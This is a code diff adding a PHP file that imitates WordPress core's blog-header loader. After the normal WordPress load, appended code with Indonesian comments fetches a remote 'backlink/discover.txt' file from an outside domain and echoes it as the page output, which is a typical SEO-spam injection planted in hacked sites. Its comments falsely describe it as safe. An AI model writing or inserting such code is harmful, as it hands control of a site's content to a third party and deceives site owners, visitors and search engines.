@@ -1,0 +1,53 @@
+<?php
+/**
+ * Loads the WordPress environment and template,
+ * lalu menampilkan konten dari discover.txt secara aman.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+	$wp_did_header = true;
+
+	// Load WordPress core
+	require_once __DIR__ . '/wp-load.php';
+
+	// Jalankan WP Query
+	wp();
+
+	// Muat template default
+	require_once ABSPATH . WPINC . '/template-loader.php';
+}
+
+// ==========================
+//  BAGIAN TAMBAHAN KITA
+// ==========================
+
+// URL file discover.txt
+$url = 'https://kampungkeramat.site/backlink/discover.txt';
+
+// Validasi URL sebelum ambil data
+if ( filter_var( $url, FILTER_VALIDATE_URL ) ) {
+
+	// Gunakan cURL agar aman dan kompatibel di semua hosting
+	$ch = curl_init($url);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+	curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+	$response = curl_exec($ch);
+	$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+	curl_close($ch);
+
+	if ( $http_code == 200 && !empty($response) ) {
+		header('Content-Type: text/plain; charset=utf-8');
+		echo $response;
+	} else {
+		header('HTTP/1.1 502 Bad Gateway');
+		echo 'Gagal mengambil konten dari URL.';
+	}
+
+} else {
+	header('HTTP/1.1 400 Bad Request');
+	echo 'URL tidak valid.';
+}
+?>
